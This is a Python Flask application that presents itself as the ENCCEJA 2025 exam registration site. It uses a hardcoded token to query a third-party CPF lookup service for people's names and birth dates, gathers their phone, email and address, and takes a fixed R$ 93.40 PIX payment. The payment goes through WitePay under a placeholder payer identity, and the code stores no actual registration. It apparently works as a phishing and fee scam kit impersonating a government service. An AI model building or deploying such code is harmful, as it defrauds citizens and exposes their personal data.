from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import os
import logging
import requests
import re
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "encceja_secret_2025")

# Configurar logging
logging.basicConfig(level=logging.INFO)

def consultar_cpf_api(cpf: str) -> dict:
    """
    Consulta CPF na API externa corrigida para VPS
    """
    try:
        # API de consulta CPF com estrutura corrigida
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[VPS] Resposta da API: {data}")
            
            # A API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                app.logger.info(f"[VPS] CPF consultado com sucesso na API: {cpf}")
                return {
                    'sucesso': True,
                    'nome': dados.get('nome', ''),
                    'cpf': cpf,
                    'situacao': 'REGULAR',
                    'data_nascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'telefone': '',
                    'email': ''
                }
            else:
                app.logger.warning(f"[VPS] CPF não encontrado na API: {cpf}")
                return {'sucesso': False, 'erro': 'CPF não encontrado'}
        
        app.logger.error(f"[VPS] Erro HTTP na API de CPF: {response.status_code}")
        return {'sucesso': False, 'erro': 'Erro na consulta'}
        
    except Exception as e:
        app.logger.error(f"[VPS] Erro ao consultar CPF: {e}")
        return {'sucesso': False, 'erro': 'Erro interno'}

def criar_pagamento_witepay_vps(amount: float, description: str = "Inscrição ENCCEJA 2025") -> dict:
    """
    Função específica para criar pagamento WitePay na VPS
    """
    try:
        api_key = os.environ.get('WITEPAY_API_KEY')
        if not api_key:
            app.logger.error("[VPS] WITEPAY_API_KEY não encontrada")
            return {'success': False, 'error': 'API key não configurada'}
        
        app.logger.info(f"[VPS] Iniciando pagamento WitePay - R$ {amount:.2f}")
        
        # Dados padronizados para o pagamento ENCCEJA VPS
        order_data = {
            "productData": [
                {
                    "name": description,
                    "value": int(amount * 100)  # Converter para centavos (93.40 -> 9340)
                }
            ],
            "clientData": {
                "clientName": "Receita do Amor",
                "clientDocument": "11111111000111",  # CPF/CNPJ apenas números
                "clientEmail": "gerarpagamentos@gmail.com",
                "clientPhone": "11987790088"  # Telefone apenas números
            }
        }
        
        headers = {
            'x-api-key': api_key,
            'Content-Type': 'application/json'
        }
        
        app.logger.info(f"[VPS] Criando ordem WitePay - Valor: R$ {amount:.2f}")
        
        # Passo 1: Criar ordem
        order_response = requests.post(
            'https://api.witepay.com.br/v1/order/create',
            json=order_data,
            headers=headers,
            timeout=30
        )
        
        app.logger.info(f"[VPS] Status da ordem: {order_response.status_code}")
        app.logger.info(f"[VPS] Resposta da ordem: {order_response.text}")
        
        if order_response.status_code not in [200, 201]:
            app.logger.error(f"[VPS] Erro ao criar ordem: {order_response.status_code} - {order_response.text}")
            return {'success': False, 'error': f'Erro ao criar ordem: {order_response.status_code}'}
        
        order_result = order_response.json()
        order_id = order_result.get('orderId')
        
        if not order_id:
            app.logger.error(f"[VPS] ID da ordem não encontrado: {order_result}")
            return {'success': False, 'error': 'ID da ordem não encontrado'}
        
        app.logger.info(f"[VPS] Ordem criada com sucesso: {order_id}")
        
        # Passo 2: Criar cobrança PIX
        charge_data = {
            "paymentMethod": "pix",
            "orderId": order_id
        }
        
        charge_response = requests.post(
            'https://api.witepay.com.br/v1/charge/create',
            json=charge_data,
            headers=headers,
            timeout=30
        )
        
        app.logger.info(f"[VPS] Status da cobrança: {charge_response.status_code}")
        app.logger.info(f"[VPS] Resposta da cobrança: {charge_response.text}")
        
        if charge_response.status_code not in [200, 201]:
            app.logger.error(f"[VPS] Erro ao criar cobrança: {charge_response.status_code} - {charge_response.text}")
            return {'success': False, 'error': f'Erro ao criar cobrança: {charge_response.status_code}'}
        
        charge_result = charge_response.json()
        
        # Extrair dados do PIX
        pix_code = charge_result.get('qrCode')
        transaction_id = charge_result.get('chargeId') or charge_result.get('id') or order_id
        
        if not pix_code:
            app.logger.error(f"[VPS] Código PIX não encontrado: {charge_result}")
            return {'success': False, 'error': 'Código PIX não encontrado'}
        
        app.logger.info(f"[VPS] Pagamento PIX criado com sucesso - ID: {transaction_id}")
        
        return {
            'success': True,
            'id': transaction_id,
            'pixCode': pix_code,
            'pixQrCode': pix_code,
            'pix_code': pix_code,
            'qr_code': pix_code,
            'amount': amount,
            'orderId': order_id,
            'expiresAt': charge_result.get('expiresAt'),
            'status': 'pending'
        }
        
    except requests.exceptions.Timeout:
        app.logger.error("[VPS] Timeout na requisição WitePay")
        return {'success': False, 'error': 'Timeout na requisição'}
    except requests.exceptions.RequestException as e:
        app.logger.error(f"[VPS] Erro de conexão WitePay: {e}")
        return {'success': False, 'error': 'Erro de conexão'}
    except Exception as e:
        app.logger.error(f"[VPS] Erro inesperado WitePay: {e}")
        return {'success': False, 'error': f'Erro interno: {str(e)}'}

@app.route('/')
def index():
    """Página principal - redireciona para /inscricao"""
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página principal de inscrição ENCCEJA"""
    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
    app.logger.info(f"[VPS] Renderizando página de inscrição")
    
    return render_template('inscricao.html', user_data=user_data)

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """API para consultar CPF (para a página de inscrição)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido", "sucesso": False}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # Consultar na API
        resultado = consultar_cpf_api(cpf_numerico)
        
        if resultado.get('sucesso'):
            # Converter para formato esperado pelo frontend
            user_data = {
                'cpf': resultado.get('cpf', cpf_numerico),
                'nome': resultado.get('nome', ''),
                'dataNascimento': resultado.get('data_nascimento', ''),
                'situacaoCadastral': "REGULAR",
                'telefone': '',
                'email': '',
                'sucesso': True
            }
            
            # Salvar dados na sessão
            session['user_data'] = user_data
            return jsonify(user_data)
        else:
            return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
    
    except Exception as e:
        app.logger.error(f"Erro ao processar consulta CPF: {e}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}", "sucesso": False}), 500

@app.route('/encceja-info', methods=['GET', 'POST'])
def encceja_info():
    """Página de dados encontrados"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('sucesso'):
        return redirect(url_for('inscricao'))
    
    return render_template('encceja_info.html', user_data=user_data)

@app.route('/validar-dados', methods=['GET', 'POST'])
def validar_dados():
    """Página de validação de dados"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Atualizar dados do usuário
        user_data.update({
            'telefone': request.form.get('telefone', ''),
            'email': request.form.get('email', ''),
            'endereco': request.form.get('endereco', ''),
            'cidade': request.form.get('cidade', ''),
            'estado': request.form.get('estado', '')
        })
        session['user_data'] = user_data
        return redirect(url_for('endereco'))
    
    return render_template('validar_dados.html', user_data=user_data)

@app.route('/endereco', methods=['GET', 'POST'])
def endereco():
    """Página de coleta de endereço"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Atualizar dados do usuário com endereço
        user_data.update({
            'cep': request.form.get('cep', ''),
            'logradouro': request.form.get('logradouro', ''),
            'numero': request.form.get('numero', ''),
            'complemento': request.form.get('complemento', ''),
            'bairro': request.form.get('bairro', ''),
            'cidade': request.form.get('cidade', ''),
            'estado': request.form.get('estado', ''),
            'telefone': request.form.get('telefone', ''),
            'email': request.form.get('email', '')
        })
        session['user_data'] = user_data
        return redirect(url_for('local_prova'))
    
    return render_template('endereco.html', user_data=user_data)

@app.route('/local-prova', methods=['GET', 'POST'])
def local_prova():
    """Página de seleção do local de prova"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Atualizar dados do usuário com local de prova
        user_data.update({
            'local_prova': request.form.get('local_prova', ''),
            'cidade_prova': request.form.get('cidade_prova', ''),
            'estado_prova': request.form.get('estado_prova', '')
        })
        session['user_data'] = user_data
        return redirect(url_for('pagamento'))
    
    return render_template('local_prova.html', user_data=user_data)

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    """Página de pagamento PIX - aceita GET e POST para VPS"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    # Se for POST (tentativa de pagamento via JavaScript antigo)
    if request.method == 'POST':
        try:
            # Valor fixo do ENCCEJA
            amount = 93.40
            description = "Inscrição ENCCEJA 2025"
            
            app.logger.info(f"[VPS] Pagamento via POST - R$ {amount:.2f}")
            
            # Criar pagamento
            result = criar_pagamento_witepay_vps(amount, description)
            
            if result.get('success'):
                # Salvar dados do pagamento na sessão
                session['payment_data'] = result
                
                app.logger.info(f"[VPS] Pagamento criado via POST - ID: {result.get('id')}")
                
                return jsonify(result)
            else:
                error_msg = result.get('error', 'Erro desconhecido')
                app.logger.error(f"[VPS] Erro no pagamento via POST: {error_msg}")
                return jsonify(result), 400
        
        except Exception as e:
            app.logger.error(f"[VPS] Erro inesperado no POST: {e}")
            return jsonify({
                'success': False,
                'error': f'Erro interno: {str(e)}'
            }), 500
    
    # Para GET, renderizar a página normalmente
    return render_template('pagamento.html', user_data=user_data)

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Rota específica para criar pagamento PIX via AJAX"""
    try:
        # Valor fixo do ENCCEJA
        amount = 93.40
        description = "Inscrição ENCCEJA 2025"
        
        app.logger.info(f"[VPS] Criando pagamento via /criar-pagamento-pix - R$ {amount:.2f}")
        
        # Criar pagamento
        result = criar_pagamento_witepay_vps(amount, description)
        
        if result.get('success'):
            # Salvar dados do pagamento na sessão
            session['payment_data'] = result
            
            app.logger.info(f"[VPS] Pagamento PIX criado com sucesso - ID: {result.get('id')}")
            
            return jsonify(result)
        else:
            error_msg = result.get('error', 'Erro desconhecido')
            app.logger.error(f"[VPS] Erro ao criar pagamento PIX: {error_msg}")
            return jsonify(result), 400
    
    except Exception as e:
        app.logger.error(f"[VPS] Erro inesperado ao criar pagamento: {e}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500

@app.route('/verificar-pagamento/<transaction_id>')
def verificar_pagamento(transaction_id):
    """Verificar status do pagamento"""
    try:
        api_key = os.environ.get('WITEPAY_API_KEY')
        if not api_key:
            return jsonify({'status': 'pending', 'paid': False})
        
        headers = {
            'x-api-key': api_key,
            'Content-Type': 'application/json'
        }
        
        # Verificar status da cobrança
        response = requests.get(
            f'https://api.witepay.com.br/v1/charge/{transaction_id}',
            headers=headers,
            timeout=15
        )
        
        if response.status_code == 200:
            result = response.json()
            status = result.get('status', '').upper()
            
            # Status conhecidos do WitePay
            if status in ['PAID', 'COMPLETED', 'APPROVED']:
                return jsonify({'status': 'paid', 'paid': True})
            elif status in ['CANCELED', 'REJECTED', 'FAILED']:
                return jsonify({'status': 'failed', 'paid': False})
            else:
                return jsonify({'status': 'pending', 'paid': False})
        
        return jsonify({'status': 'pending', 'paid': False})
        
    except Exception as e:
        app.logger.error(f"[VPS] Erro ao verificar pagamento: {e}")
        return jsonify({'status': 'pending', 'paid': False})

@app.route('/witepay-postback', methods=['POST'])
def witepay_postback():
    """Receber notificações do WitePay"""
    try:
        data = request.get_json()
        app.logger.info(f"[VPS] Postback recebido: {data}")
        
        # Processar postback
        status = data.get('status', '').upper()
        if status in ['PAID', 'COMPLETED', 'APPROVED']:
            app.logger.info("[VPS] Pagamento confirmado via postback")
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        app.logger.error(f"[VPS] Erro no postback: {e}")
        return jsonify({'status': 'error'})

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    user_data = session.get('user_data', {})
    return render_template('inscricao_sucesso.html', user_data=user_data)

@app.route('/obrigado')
def obrigado():
    """Página de agradecimento"""
    user_data = session.get('user_data', {})
    return render_template('inscricao_sucesso.html', user_data=user_data)

@app.route('/aviso')
def aviso():
    """Página de aviso"""
    user_data = session.get('user_data', {})
    return render_template('aviso.html', user_data=user_data)

# Rotas de compatibilidade
@app.route('/index')
def index_redirect():
    return redirect(url_for('inscricao'))

@app.route('/encceja')
def encceja():
    return redirect(url_for('inscricao'))

# Rota para API do ViaCEP (busca de endereço por CEP)
@app.route('/api/cep/<cep>')
def buscar_cep(cep):
    """Buscar endereço por CEP usando ViaCEP"""
    try:
        import requests
        response = requests.get(f'https://viacep.com.br/ws/{cep}/json/', timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'erro' not in data:
                return jsonify({
                    'success': True,
                    'logradouro': data.get('logradouro', ''),
                    'bairro': data.get('bairro', ''),
                    'cidade': data.get('localidade', ''),
                    'estado': data.get('uf', ''),
                    'cep': data.get('cep', '')
                })
        
        return jsonify({'success': False, 'error': 'CEP não encontrado'})
    
    except Exception as e:
        app.logger.error(f"[VPS] Erro ao buscar CEP: {e}")
        return jsonify({'success': False, 'error': 'Erro na consulta do CEP'})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)